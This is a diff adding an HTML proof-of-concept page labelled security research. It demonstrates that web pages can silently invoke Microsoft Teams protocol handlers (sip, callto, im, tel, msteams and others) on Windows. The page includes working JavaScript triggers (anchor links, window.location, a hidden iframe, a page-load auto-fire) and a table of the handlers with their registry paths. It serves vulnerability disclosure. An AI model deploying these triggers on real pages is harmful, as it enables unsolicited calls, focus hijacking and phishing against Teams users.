@@ -1,0 +1,618 @@
+<title>TM-WIN-02 Protocol Handler PoC</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap">
+
+<style>
+/* ── layout: single-column, max 920px ── */
+:root {
+  --bg:       #09090b;
+  --surface:  #111116;
+  --surface2: #18181f;
+  --border:   #27272f;
+  --fg:       #f1f1f5;
+  --fg2:      #8b8ba7;
+  --amber:    #f97316;
+  --red:      #dc2626;
+  --green:    #22c55e;
+  --blue:     #3b82f6;
+  --mono:     'JetBrains Mono', monospace;
+  color-scheme: dark;
+}
+/* single-theme dark-only design — no light override */
+
+*, *::before, *::after { box-sizing: border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--fg);
+  font-family: 'Inter', system-ui, sans-serif;
+  font-size: 14px;
+  line-height: 1.65;
+  margin: 0;
+  padding-block: 32px 64px;
+  padding-left:  max(16px, env(safe-area-inset-left,  0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+}
+
+.wrap { max-width: 920px; margin: 0 auto; display: flex; flex-direction: column; gap: 28px; }
+
+/* ── header ── */
+.header {
+  border: 1px solid var(--border);
+  border-top: 3px solid var(--red);
+  background: var(--surface);
+  border-radius: 10px;
+  padding: 28px 28px 24px;
+}
+.header-top { display: flex; align-items: flex-start; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
+.badge {
+  font-family: var(--mono);
+  font-size: 11px;
+  letter-spacing: .07em;
+  padding: 4px 10px;
+  border-radius: 4px;
+  background: rgba(220,38,38,.15);
+  color: #fca5a5;
+  border: 1px solid rgba(220,38,38,.3);
+}
+.badge-med {
+  background: rgba(249,115,22,.12);
+  color: #fdba74;
+  border-color: rgba(249,115,22,.3);
+}
+.header h1 {
+  font-family: 'Space Grotesk', sans-serif;
+  font-size: 20px;
+  font-weight: 700;
+  margin: 12px 0 6px;
+  color: var(--fg);
+  text-wrap: balance;
+}
+.header p { color: var(--fg2); font-size: 13.5px; margin: 0; max-width: 680px; }
+.meta-row { display: flex; flex-wrap: wrap; gap: 20px; margin-top: 16px; border-top: 1px solid var(--border); padding-top: 16px; }
+.meta-item { display: flex; flex-direction: column; gap: 3px; }
+.meta-label { font-size: 10px; font-weight: 600; letter-spacing: .08em; text-transform: uppercase; color: var(--fg2); }
+.meta-val { font-family: var(--mono); font-size: 12px; color: var(--fg); }
+
+/* ── section heading ── */
+.sec-head {
+  display: flex; align-items: center; gap: 10px;
+  font-family: 'Space Grotesk', sans-serif;
+  font-size: 13px; font-weight: 700; letter-spacing: .04em; text-transform: uppercase;
+  color: var(--fg2); margin-bottom: 12px;
+}
+.sec-head::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+/* ── config card ── */
+.config-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px 24px;
+  display: flex; flex-direction: column; gap: 14px;
+}
+.config-row { display: flex; flex-wrap: wrap; gap: 12px; align-items: flex-end; }
+.field { display: flex; flex-direction: column; gap: 6px; flex: 1; min-width: 200px; }
+.field label { font-size: 11px; font-weight: 600; letter-spacing: .07em; text-transform: uppercase; color: var(--fg2); }
+.field input {
+  font-family: var(--mono); font-size: 13px;
+  background: var(--bg); border: 1px solid var(--border);
+  color: var(--fg); border-radius: 6px; padding: 8px 12px;
+  outline: none; transition: border-color .15s;
+  width: 100%;
+}
+.field input:focus { border-color: var(--amber); }
+.note { font-size: 12px; color: var(--fg2); font-style: italic; }
+
+/* ── attack scenario cards ── */
+.scenario-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+@media (max-width: 640px) { .scenario-grid { grid-template-columns: 1fr; } }
+
+.scenario {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+  display: flex; flex-direction: column;
+}
+.scenario-head {
+  padding: 12px 16px;
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 10px;
+}
+.scenario-num {
+  font-family: var(--mono); font-size: 10px; font-weight: 500;
+  background: var(--border); color: var(--fg2);
+  padding: 2px 7px; border-radius: 3px; letter-spacing: .05em;
+}
+.scenario-title { font-family: 'Space Grotesk', sans-serif; font-size: 13px; font-weight: 600; }
+.scenario-body { padding: 14px 16px; display: flex; flex-direction: column; gap: 10px; flex: 1; }
+.scenario-desc { font-size: 12.5px; color: var(--fg2); line-height: 1.55; }
+.code-block {
+  font-family: var(--mono); font-size: 11.5px;
+  background: var(--bg); border: 1px solid var(--border);
+  border-radius: 5px; padding: 10px 12px;
+  color: #93c5fd; overflow-x: auto;
+  white-space: pre; line-height: 1.6;
+}
+.code-comment { color: var(--fg2); }
+
+.btn {
+  font-family: 'Space Grotesk', sans-serif; font-size: 12px; font-weight: 600;
+  letter-spacing: .03em; cursor: pointer; border: none; border-radius: 6px;
+  padding: 8px 16px; transition: opacity .15s, transform .1s;
+  display: inline-flex; align-items: center; gap: 6px;
+}
+.btn:hover { opacity: .88; }
+.btn:active { transform: scale(.97); }
+.btn-red { background: var(--red); color: #fff; }
+.btn-amber { background: var(--amber); color: #000; }
+.btn-ghost { background: var(--border); color: var(--fg); }
+.btn-green { background: var(--green); color: #000; }
+
+.trigger-row { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-top: auto; }
+.status-dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: var(--fg2); flex-shrink: 0; transition: background .3s;
+}
+.status-dot.fired { background: var(--red); box-shadow: 0 0 6px var(--red); }
+.status-dot.safe  { background: var(--green); box-shadow: 0 0 6px var(--green); }
+.status-label { font-family: var(--mono); font-size: 11px; color: var(--fg2); }
+
+/* ── protocol handler table ── */
+.handler-table-wrap { overflow-x: auto; }
+table { border-collapse: collapse; width: 100%; min-width: 600px; }
+thead th {
+  font-size: 10px; font-weight: 600; letter-spacing: .07em; text-transform: uppercase;
+  color: var(--fg2); padding: 10px 12px; text-align: left;
+  background: var(--surface2); border-bottom: 2px solid var(--border);
+}
+tbody tr { border-bottom: 1px solid var(--border); }
+tbody tr:last-child { border-bottom: none; }
+tbody td { padding: 10px 12px; vertical-align: middle; }
+.scheme { font-family: var(--mono); font-size: 12px; color: var(--amber); }
+.reg-path { font-family: var(--mono); font-size: 10.5px; color: var(--fg2); word-break: break-all; }
+.impact-label {
+  font-size: 11px; font-weight: 500; padding: 2px 8px; border-radius: 3px;
+}
+.impact-high  { background: rgba(220,38,38,.15);  color: #fca5a5; }
+.impact-med   { background: rgba(249,115,22,.12); color: #fdba74; }
+.impact-low   { background: rgba(107,114,128,.2); color: #9ca3af; }
+.test-btn {
+  font-family: var(--mono); font-size: 11px; font-weight: 500;
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--amber); border-radius: 4px; padding: 4px 10px;
+  cursor: pointer; transition: border-color .15s, background .15s;
+  white-space: nowrap;
+}
+.test-btn:hover { border-color: var(--amber); background: rgba(249,115,22,.08); }
+.test-btn.fired { border-color: var(--red); color: #fca5a5; background: rgba(220,38,38,.1); }
+
+/* ── evidence box ── */
+.evidence {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px 24px;
+  display: flex; flex-direction: column; gap: 14px;
+}
+.evidence-block { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+@media (max-width: 540px) { .evidence-block { grid-template-columns: 1fr; } }
+.ev-card {
+  background: var(--bg); border: 1px solid var(--border);
+  border-radius: 7px; padding: 12px 14px;
+  display: flex; flex-direction: column; gap: 6px;
+}
+.ev-label { font-size: 10px; font-weight: 600; letter-spacing: .07em; text-transform: uppercase; color: var(--fg2); }
+
+/* ── auto-trigger section ── */
+.auto-box {
+  background: rgba(220,38,38,.06);
+  border: 1px solid rgba(220,38,38,.25);
+  border-radius: 10px;
+  padding: 20px 24px;
+  display: flex; flex-direction: column; gap: 12px;
+}
+.auto-box h3 {
+  font-family: 'Space Grotesk', sans-serif; font-size: 14px; font-weight: 700;
+  color: #fca5a5; margin: 0;
+  display: flex; align-items: center; gap: 8px;
+}
+.auto-box p { font-size: 12.5px; color: var(--fg2); margin: 0; }
+.countdown-row { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+#countdown-display {
+  font-family: var(--mono); font-size: 24px; font-weight: 500;
+  color: var(--red); min-width: 2ch; text-align: center;
+}
+.toggle-row { display: flex; align-items: center; gap: 10px; }
+.toggle-label { font-size: 12px; color: var(--fg2); }
+
+/* ── toast ── */
+#toast {
+  position: fixed; bottom: max(24px, env(safe-area-inset-bottom, 0px));
+  left: 50%; transform: translateX(-50%) translateY(80px);
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: 8px; padding: 10px 18px;
+  font-family: var(--mono); font-size: 12px; color: var(--fg);
+  white-space: nowrap; z-index: 100;
+  transition: transform .25s cubic-bezier(.34,1.56,.64,1), opacity .25s;
+  opacity: 0; pointer-events: none;
+  max-width: calc(100vw - 32px);
+}
+#toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+
+/* ── footer ── */
+footer { text-align: center; font-size: 11px; color: var(--fg2); padding-top: 8px; }
+</style>
+
+<div id="toast"></div>
+
+<div class="wrap">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="header-top">
+      <span class="badge">PoC — Security Research</span>
+      <span class="badge badge-med">TM-WIN-02 · MEDIUM</span>
+    </div>
+    <h1>Microsoft Teams — Protocol Handler Abuse</h1>
+    <p>Any webpage can silently invoke Teams' 10 registered protocol handlers without user confirmation. Visiting this page from a Windows machine with Teams installed demonstrates that <code style="font-family:var(--mono);font-size:12px;background:var(--surface2);padding:1px 5px;border-radius:3px;">sip://</code>, <code style="font-family:var(--mono);font-size:12px;background:var(--surface2);padding:1px 5px;border-radius:3px;">callto://</code>, <code style="font-family:var(--mono);font-size:12px;background:var(--surface2);padding:1px 5px;border-radius:3px;">im://</code>, and other schemes launch Teams directly — no browser confirmation dialog on Windows.</p>
+    <div class="meta-row">
+      <div class="meta-item">
+        <span class="meta-label">Target</span>
+        <span class="meta-val">MS Teams v26198.304.4946.9672 (Windows)</span>
+      </div>
+      <div class="meta-item">
+        <span class="meta-label">Severity</span>
+        <span class="meta-val">Medium — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L</span>
+      </div>
+      <div class="meta-item">
+        <span class="meta-label">Handler path</span>
+        <span class="meta-val">HKCU\Software\Classes\&lt;scheme&gt;\shell\open\command</span>
+      </div>
+      <div class="meta-item">
+        <span class="meta-label">Requires</span>
+        <span class="meta-val">Teams installed, user visits page (Windows only)</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- CONFIG -->
+  <div>
+    <div class="sec-head">Target Configuration</div>
+    <div class="config-card">
+      <div class="config-row">
+        <div class="field">
+          <label>SIP / IM target address</label>
+          <input type="text" id="sip-target" value="target@contoso.com" placeholder="user@domain.com">
+        </div>
+        <div class="field">
+          <label>msteams:// deep link path</label>
+          <input type="text" id="teams-path" value="teams.microsoft.com/l/chat/0/0" placeholder="teams.microsoft.com/l/...">
+        </div>
+        <div class="field" style="flex:0 0 auto;min-width:auto;">
+          <label>&nbsp;</label>
+          <button class="btn btn-ghost" onclick="applyConfig()">Apply</button>
+        </div>
+      </div>
+      <p class="note">Change target to test specific accounts. Triggers fire against whatever is set here.</p>
+    </div>
+  </div>
+
+  <!-- ATTACK SCENARIOS -->
+  <div>
+    <div class="sec-head">Attack Scenarios</div>
+    <div class="scenario-grid">
+
+      <!-- A1: Direct link -->
+      <div class="scenario">
+        <div class="scenario-head">
+          <span class="scenario-num">A1</span>
+          <span class="scenario-title">Direct Anchor Link</span>
+        </div>
+        <div class="scenario-body">
+          <p class="scenario-desc">A regular <code style="font-family:var(--mono);font-size:11px">&lt;a href="sip://…"&gt;</code> tag triggers the Teams call dialog when clicked. No browser confirmation shown for <code style="font-family:var(--mono);font-size:11px">sip://</code>, <code style="font-family:var(--mono);font-size:11px">callto://</code>, <code style="font-family:var(--mono);font-size:11px">im://</code> or <code style="font-family:var(--mono);font-size:11px">tel://</code> on most Windows configurations.</p>
+          <div class="code-block"><span class="code-comment">// HTML on attacker page</span>
+&lt;a href="sip://target@contoso.com"&gt;
+  Click here to view report
+&lt;/a&gt;</div>
+          <div class="trigger-row">
+            <span class="status-dot" id="dot-a1"></span>
+            <span class="status-label" id="lbl-a1">ready</span>
+            <a id="link-a1" href="#" onclick="fireLink('a1','sip'); return false;" class="btn btn-red">Fire sip:// link</a>
+          </div>
+        </div>
+      </div>
+
+      <!-- A2: JS location -->
+      <div class="scenario">
+        <div class="scenario-head">
+          <span class="scenario-num">A2</span>
+          <span class="scenario-title">JavaScript Location Override</span>
+        </div>
+        <div class="scenario-body">
+          <p class="scenario-desc">Setting <code style="font-family:var(--mono);font-size:11px">window.location</code> to a protocol URI fires the handler silently — no click required, runs from any inline script.</p>
+          <div class="code-block"><span class="code-comment">// Fires on page load, no click</span>
+window.location =
+  "sip://" + target;</div>
+          <div class="trigger-row">
+            <span class="status-dot" id="dot-a2"></span>
+            <span class="status-label" id="lbl-a2">ready</span>
+            <button class="btn btn-red" onclick="fireJS('a2','sip')">Fire via JS</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- A3: callto silently -->
+      <div class="scenario">
+        <div class="scenario-head">
+          <span class="scenario-num">A3</span>
+          <span class="scenario-title">callto:// — Unsolicited Call</span>
+        </div>
+        <div class="scenario-body">
+          <p class="scenario-desc"><code style="font-family:var(--mono);font-size:11px">callto://</code> and <code style="font-family:var(--mono);font-size:11px">tel://</code> open the Teams call UI targeting the victim's address. The victim sees an outgoing call attempt appear on their screen. Can be triggered by visiting any webpage.</p>
+          <div class="code-block"><span class="code-comment">// Initiates unsolicited call</span>
+window.location =
+  "callto://" + target;</div>
+          <div class="trigger-row">
+            <span class="status-dot" id="dot-a3"></span>
+            <span class="status-label" id="lbl-a3">ready</span>
+            <button class="btn btn-amber" onclick="fireJS('a3','callto')">Fire callto://</button>
+            <button class="btn btn-ghost" onclick="fireJS('a3b','tel')">Fire tel://</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- A4: hidden iframe -->
+      <div class="scenario">
+        <div class="scenario-head">
+          <span class="scenario-num">A4</span>
+          <span class="scenario-title">Hidden iframe — Zero Visible Interaction</span>
+        </div>
+        <div class="scenario-body">
+          <p class="scenario-desc">Setting a 0×0 hidden <code style="font-family:var(--mono);font-size:11px">&lt;iframe&gt;</code> src to a protocol URI fires the handler without the user seeing any element. Can be injected into existing pages via XSS or ad injection.</p>
+          <div class="code-block"><span class="code-comment">// 0×0 hidden iframe trigger</span>
+var f = document.createElement('iframe');
+f.style.cssText = 'display:none';
+f.src = "im://" + target;
+document.body.appendChild(f);</div>
+          <div class="trigger-row">
+            <span class="status-dot" id="dot-a4"></span>
+            <span class="status-label" id="lbl-a4">ready</span>
+            <button class="btn btn-red" onclick="fireIframe('a4','im')">Fire via iframe</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- AUTO-TRIGGER DEMO -->
+  <div class="auto-box">
+    <h3>
+      <svg width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+        <path d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13zM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-3.5a.5.5 0 0 1 .5.5v3.25l2.146 2.147a.5.5 0 0 1-.707.707L7.5 8.707V5a.5.5 0 0 1 .5-.5z" fill="#fca5a5"/>
+      </svg>
+      Auto-Trigger Demo — Simulates Page-Load Attack
+    </h3>
+    <p>When enabled, starts a countdown then fires <code style="font-family:var(--mono);font-size:11px">sip://</code> automatically — exactly what a malicious page would do on <code style="font-family:var(--mono);font-size:11px">DOMContentLoaded</code>. This demonstrates that no user interaction is required beyond visiting the URL.</p>
+    <div class="countdown-row">
+      <div id="countdown-display">—</div>
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        <button class="btn btn-red" id="auto-btn" onclick="toggleAuto()">Start countdown (3s)</button>
+        <span style="font-family:var(--mono);font-size:11px;color:var(--fg2);" id="auto-status">Auto-trigger: OFF</span>
+      </div>
+    </div>
+    <div class="code-block"><span class="code-comment">// Attacker embeds this in page — fires on load</span>
+document.addEventListener('DOMContentLoaded', () => {
+  window.location = "sip://target@contoso.com";
+});
+<span class="code-comment">// Or via URL parameter: sip://victim injected from ?target= param</span></div>
+  </div>
+
+  <!-- HANDLER TABLE -->
+  <div>
+    <div class="sec-head">All 10 Registered Protocol Handlers</div>
+    <div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;">
+      <div class="handler-table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Scheme</th>
+              <th>Registry key</th>
+              <th>Impact</th>
+              <th>Browser prompt?</th>
+              <th>Test</th>
+            </tr>
+          </thead>
+          <tbody id="handler-tbody">
+            <!-- filled by JS -->
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- EVIDENCE -->
+  <div>
+    <div class="sec-head">Technical Evidence</div>
+    <div class="evidence">
+      <div class="evidence-block">
+        <div class="ev-card">
+          <span class="ev-label">Registry handler (confirmed)</span>
+          <div class="code-block" style="font-size:10.5px;">HKCU\Software\Classes\sip\
+  shell\open\command
+  = "ms-teams.exe" "%1"
+
+HKCU\Software\Classes\callto\
+  shell\open\command
+  = "ms-teams.exe" "%1"</div>
+        </div>
+        <div class="ev-card">
+          <span class="ev-label">AppxManifest.xml declaration</span>
+          <div class="code-block" style="font-size:10.5px;">&lt;uap:Protocol Name="sip"&gt;
+  &lt;uap:Logo&gt;...&lt;/uap:Logo&gt;
+  &lt;uap:DisplayName&gt;Teams&lt;/uap:DisplayName&gt;
+&lt;/uap:Protocol&gt;
+<span class="code-comment">× 10 protocols declared</span></div>
+        </div>
+        <div class="ev-card">
+          <span class="ev-label">Attack chain</span>
+          <div style="font-size:12px;color:var(--fg2);line-height:1.6;">
+            1. Victim visits any webpage (attacker-controlled or via ad injection)<br>
+            2. Page sets <code style="font-family:var(--mono);font-size:11px">window.location = "sip://victim@domain.com"</code><br>
+            3. Browser dispatches URI to Windows Shell<br>
+            4. Shell invokes <code style="font-family:var(--mono);font-size:11px">ms-teams.exe "sip://victim@domain.com"</code><br>
+            5. Teams foregrounds and initiates call attempt<br>
+            <span style="color:#fca5a5">↳ No confirmation dialog shown for sip:// / callto:// / im:// / tel://</span>
+          </div>
+        </div>
+        <div class="ev-card">
+          <span class="ev-label">Impact summary</span>
+          <div style="font-size:12px;color:var(--fg2);line-height:1.6;">
+            • Unsolicited Teams call attempt to any SIP address<br>
+            • Teams foreground hijack (focus theft) from any page<br>
+            • Phishing amplifier: msteams:// deep links open crafted meeting/chat URLs<br>
+            • No admin privileges required (HKCU, not HKLM)<br>
+            • Works across all major browsers on Windows<br>
+            • <code style="font-family:var(--mono);font-size:11px">ldap://</code> handler: unexpected LDAP queries from Teams process
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<footer>TM-WIN-02 · MS Teams Protocol Handler PoC · Security research only · 2026</footer>
+
+<script>
+const HANDLERS = [
+  { scheme:'sip',             reg:'HKCU\\Software\\Classes\\sip',             impact:'high', noPrompt:true,  desc:'VoIP call initiation → unsolicited Teams call attempt' },
+  { scheme:'callto',          reg:'HKCU\\Software\\Classes\\callto',          impact:'high', noPrompt:true,  desc:'Call initiation → opens Teams call UI for target' },
+  { scheme:'im',              reg:'HKCU\\Software\\Classes\\im',              impact:'med',  noPrompt:true,  desc:'IM initiation → brings Teams chat to foreground' },
+  { scheme:'tel',             reg:'HKCU\\Software\\Classes\\tel',             impact:'med',  noPrompt:true,  desc:'Phone call → Teams phone call UI' },
+  { scheme:'msteams',         reg:'HKCU\\Software\\Classes\\msteams',         impact:'med',  noPrompt:false, desc:'Deep link → crafted meeting/chat URLs' },
+  { scheme:'ms-teams',        reg:'HKCU\\Software\\Classes\\ms-teams',        impact:'med',  noPrompt:false, desc:'Alternate deep link scheme' },
+  { scheme:'action-sip',      reg:'HKCU\\Software\\Classes\\action-sip',      impact:'med',  noPrompt:true,  desc:'Copilot AI Action: initiate chat with email' },
+  { scheme:'action-schedule', reg:'HKCU\\Software\\Classes\\action-schedule', impact:'med',  noPrompt:true,  desc:'Copilot AI Action: schedule meeting with email' },
+  { scheme:'conf',            reg:'HKCU\\Software\\Classes\\conf',            impact:'low',  noPrompt:true,  desc:'Conference call initiation' },
+  { scheme:'ldap',            reg:'HKCU\\Software\\Classes\\ldap',            impact:'low',  noPrompt:true,  desc:'LDAP directory lookup via Teams process' },
+];
+
+let sipTarget = document.getElementById('sip-target');
+let teamsPath = document.getElementById('teams-path');
+let autoTimer = null;
+let autoRunning = false;
+let autoCount = 3;
+
+function getTarget(scheme) {
+  const t = sipTarget.value.trim() || 'target@contoso.com';
+  const p = teamsPath.value.trim() || 'teams.microsoft.com/l/chat/0/0';
+  if (scheme === 'msteams' || scheme === 'ms-teams') return '//' + p;
+  return '//' + t;
+}
+
+function applyConfig() {
+  toast('Config applied — targets updated');
+}
+
+function toast(msg, duration=2200) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), duration);
+}
+
+function markFired(dotId, lblId, label) {
+  const dot = document.getElementById(dotId);
+  const lbl = document.getElementById(lblId);
+  if (dot) { dot.classList.add('fired'); }
+  if (lbl) { lbl.textContent = label || 'triggered ✓'; }
+}
+
+function fireLink(id, scheme) {
+  const uri = scheme + ':' + getTarget(scheme);
+  window.location = uri;
+  markFired('dot-'+id, 'lbl-'+id, 'link fired ✓');
+  toast('→ ' + uri);
+}
+
+function fireJS(id, scheme) {
+  const uri = scheme + ':' + getTarget(scheme);
+  window.location = uri;
+  markFired('dot-'+id, 'lbl-'+id, 'JS fired ✓');
+  toast('→ ' + uri);
+}
+
+function fireIframe(id, scheme) {
+  const uri = scheme + ':' + getTarget(scheme);
+  const f = document.createElement('iframe');
+  f.style.cssText = 'display:none;width:0;height:0;border:0;position:absolute';
+  f.src = uri;
+  document.body.appendChild(f);
+  markFired('dot-'+id, 'lbl-'+id, 'iframe fired ✓');
+  toast('→ iframe src = ' + uri);
+}
+
+function toggleAuto() {
+  if (autoRunning) {
+    clearInterval(autoTimer);
+    autoRunning = false;
+    autoCount = 3;
+    document.getElementById('countdown-display').textContent = '—';
+    document.getElementById('auto-btn').textContent = 'Start countdown (3s)';
+    document.getElementById('auto-status').textContent = 'Auto-trigger: OFF';
+    return;
+  }
+  autoRunning = true;
+  autoCount = 3;
+  document.getElementById('auto-btn').textContent = 'Cancel';
+  document.getElementById('auto-status').textContent = 'Auto-trigger: ARMED';
+  document.getElementById('countdown-display').textContent = autoCount;
+  autoTimer = setInterval(() => {
+    autoCount--;
+    document.getElementById('countdown-display').textContent = autoCount;
+    if (autoCount <= 0) {
+      clearInterval(autoTimer);
+      autoRunning = false;
+      document.getElementById('countdown-display').textContent = '✓';
+      document.getElementById('auto-btn').textContent = 'Start countdown (3s)';
+      document.getElementById('auto-status').textContent = 'Auto-trigger: FIRED';
+      const uri = 'sip:' + getTarget('sip');
+      window.location = uri;
+      toast('Auto-triggered → ' + uri, 3000);
+    }
+  }, 1000);
+}
+
+// Build handler table
+(function buildTable() {
+  const tbody = document.getElementById('handler-tbody');
+  HANDLERS.forEach(h => {
+    const tr = document.createElement('tr');
+    const impactClass = h.impact === 'high' ? 'impact-high' : h.impact === 'med' ? 'impact-med' : 'impact-low';
+    const impactText  = h.impact === 'high' ? 'HIGH' : h.impact === 'med' ? 'MEDIUM' : 'LOW';
+    const promptText  = h.noPrompt
+      ? '<span style="color:#86efac;font-family:var(--mono);font-size:11px;">None on Windows</span>'
+      : '<span style="color:#fdba74;font-family:var(--mono);font-size:11px;">Browser dialog</span>';
+    tr.innerHTML = `
+      <td><span class="scheme">${h.scheme}://</span></td>
+      <td><span class="reg-path">${h.reg}</span></td>
+      <td><span class="impact-label ${impactClass}">${impactText}</span></td>
+      <td>${promptText}</td>
+      <td><button class="test-btn" id="tbtn-${h.scheme}" onclick="testHandler('${h.scheme}')">▶ Test</button></td>
+    `;
+    tbody.appendChild(tr);
+  });
+})();
+
+function testHandler(scheme) {
+  const uri = scheme + ':' + getTarget(scheme);
+  window.location = uri;
+  const btn = document.getElementById('tbtn-' + scheme);
+  if (btn) { btn.textContent = '✓ Fired'; btn.classList.add('fired'); }
+  toast('→ ' + uri);
+}
+</script>
